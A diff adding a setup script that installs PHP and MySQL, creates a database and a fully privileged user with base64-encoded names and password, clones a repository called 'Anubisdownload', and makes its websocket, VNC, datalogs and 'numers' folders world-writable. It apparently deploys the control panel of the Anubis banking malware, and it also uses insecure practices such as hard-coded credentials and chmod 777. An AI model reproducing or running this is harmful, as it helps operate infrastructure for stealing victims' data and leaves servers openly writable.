@@ -1,0 +1,33 @@
+
+apt update
+apt install git screen nano 
+apt install zlib1g
+apt install zlib1g-dev
+apt -y install software-properties-common
+add-apt-repository ppa:ondrej/php
+apt install mysql-server php7.0 php7.0-mysql php7.0-json php7.0-cli php7.0-gd php7.0-mbstring php7.0-xml
+cd /var/run
+service mysql restart
+chmod 777 mysqld
+mysql
+CREATE DATABASE `YW51YmlzZGI`;
+CREATE USER 'anubisroot'@'localhost' IDENTIFIED BY 'd2Vyd2Vxc2Q';
+GRANT ALL PRIVILEGES ON *.* TO 'anubisroot'@'localhost';
+FLUSH PRIVILEGES;
+cd /
+git clone https://github.com/CubRube/Anubisdownload
+mv Anubisdownload htmlanubis
+chmod 777 htmlanubis
+cd /htmlanubis
+mv phpmyadmin /htmlphpmyadmin
+mysql -u root -p YW51YmlzZGI < database.sql
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\websocket\*.*
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\websocket\sound\*.*
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\websocket\VNC\*.*
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\*.*
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\*.*
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\files\*.*
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\logs\*.*
+chmod 777 c2Zkc2RmYXNkYXNzZGE\application\datalogs\numers\*.*
+
+
